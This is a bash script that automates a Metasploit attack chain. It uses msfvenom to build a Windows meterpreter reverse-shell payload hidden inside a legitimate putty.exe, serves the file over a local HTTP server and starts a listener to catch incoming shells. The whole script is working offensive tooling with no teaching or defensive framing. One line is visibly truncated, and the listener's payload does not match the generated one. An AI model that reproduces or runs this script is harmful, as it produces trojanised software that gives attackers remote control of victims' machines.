#!/bin/bash

if [ "$(whoami)" != "root" ]
then
        echo "[-] Exiting.. must run as root"
        exit
fi
echo
echo "[*] Generating your payload.."
msfvenom -p windows/meterpreter/reverse_tcp lhost=$(hostname -I) lport=$1 PrependMigrateProc=explorer.exe PrependMigrate=true -x putty.exe -k -f exe -o rev_>
echo 
echo "[*] Starting your listener.."
echo "use exploit/multi/handler
set payload cmd/windows/reverse_powershell
set lhost $(hostname -I)
set lport $1
run -j -z" > listen.rc
echo
echo "[*] Starting HTTP.Server"
python -m http.server 2>/dev/null &
echo
echo "[*] Starting Automatic Listener"
msfconsole -q -r listen.rc
